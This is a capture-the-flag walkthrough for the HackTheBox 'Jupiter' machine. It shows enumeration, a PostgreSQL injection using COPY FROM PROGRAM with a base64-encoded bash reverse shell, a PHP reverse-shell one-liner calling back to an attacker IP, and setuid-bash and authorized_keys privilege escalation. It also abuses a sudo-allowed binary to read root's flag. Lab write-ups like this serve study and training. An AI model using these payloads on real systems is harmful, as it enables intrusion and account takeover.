we add the target machine at /etc/hosts:

	sudo nano /etc/hosts
	10.10.11.216	jupiter.htb

we start with a port enumerations:

	rustscan -a jupiter.htb

output:

	Open 10.10.11.216:22
	Open 10.10.11.216:80

the 80 is open so we browse it and in the meantime we run gobuster and wfuzz for the enumeration of dir and vhosts:

	gobuster dir -u http://kiosk.jupiter.htb/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt,html,old,docx -t 200 

	wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.jupiter.htb" -u http://jupiter.htb/ --hc 301

output:

	gobuster:
	/contact.html         (Status: 200) [Size: 10141]
	/img                  (Status: 301) [Size: 178] [--> http://jupiter.htb/img/]
	/.html                (Status: 403) [Size: 162]
	/index.html           (Status: 200) [Size: 19680]
	/about.html           (Status: 200) [Size: 12613]
	/services.html        (Status: 200) [Size: 11969]

	wfuzz:
	000001955:   200        211 L    798 W      34390 Ch    "kiosk" 

gobuster seems to find some directories but if we browse the website there isn't any interesting intead of the subdomain kiosk got my attention; we add to /etc/hosts and we re-run another gobuster:

	sudo nano /etc/hosts
	10.10.11.216	jupiter.htb  kiosk.jupiter.htb

gobuster command:

	gobuster dir -u http://kiosk.jupiter.htb/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt,html,old,docx -t 200

output:

	/login                (Status: 200) [Size: 34390]
	/profile              (Status: 302) [Size: 29] [--> /login]
	/signup               (Status: 200) [Size: 34390]
	/public               (Status: 302) [Size: 31] [--> /public/]
	/admin                (Status: 302) [Size: 24] [--> /]
	/plugins              (Status: 302) [Size: 24] [--> /]

We crawl the website like for 1 hour, so we decide to open Burpsuite, there are some requests to the db and we have also the root priviliege on the db itself, so we can try to do a RCE execution via SQL injection with these payload found on internet:

	 DROP TABLE IF EXISTS cmd_exec;          
	 CREATE TABLE cmd_exec(cmd_output text);
	 "COPY cmd_exec FROM PROGRAM 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2Ljc1LzMzMzMgMD4mMQ== | base64 -d | bash';

in the meantime we run pwncat:

	python3 -m pwncat
	connect -lp 4444

we're inside with postgresql'user, time to run linpeas.sh:

	-upload /YOUR PATH/linpeas.sh /tmp/linpeas.sh

there isn't any interesting, so we try to do a simple command:

	find / -user juno 2>/dev/null

output:

	/dev/shm/network-simulation.yml 

this .yml is runned by juno and it can be exploit in order to a privesc, in the .yml we add this lines:

	/server section/
	/usr/bin/cp
	/bin/bash /tmp/bash --> juno will run is shell and we copy it in a new shell

	/client section/
	/usr/bin/chmod
	u+s /tmp/bash ---> we set userid for the bash.

if we go in /tmp and we run:

	./bash -p

we're juno but it seems we don't have the full permissions indeed we can't cat user.txt but if we run linpeas.sh, it's tell us that it's possible to modify the authorized_keys so it takes 2 minutes to change the publick key already in with an our publick key and enter via SSH:

	ssh-keygen
	/we copy the public key in authorized keys/
	ssh -i id_rsa juno@10.10.11.216

we're juno and we can retrieve the user.txt.
This time I want to relaunch the find command in order to retrieve the file owned by jovian:

	find / -user jovian 2>/dev/null

there are some jupyter log files and if you open it, you can see that:
- jupyter run on 127.0.0.1:8888
- some access token inside 

so we do these following commands:

	ssh -i id:rsa -L 8888:127.0.0.1:8888 juno@10.10.11.216 ---> we forwarded the 8888 port on the target machine on our 8888 port.
	http://127.0.0.1:8888

we paste the right token, we're in, if we search around, it seems we can add and run python script aka revshell

	python3 -m pwncat
	connect -lp 9999

	php -r '$sock=fsockopen("10.10.16.75",9999);exec("/bin/bash <&3 >&3 2>&3");' --> we run it

sbam, we're jovian, all we need is root, i run this command:

	sudo -l

and it prompted this:

	User jovian may run this following commands on jupiter:
		(ALL) NOPASSWD: /usr/local/bin/sattrack

if we run it sattrack it seems to find the configuration file, so i try to find is strings with the command below:

	strings sattrack | grep -i config

output:

	config.json

the config.json have a "tlesources" to get something from URL link, we can change with:

	file:///root/root.txt 
	sudo sattrack

and if we go strict to /tmp we can retrieve the root flag. 

rooted with Disturbante(https://github.com/Disturbante).





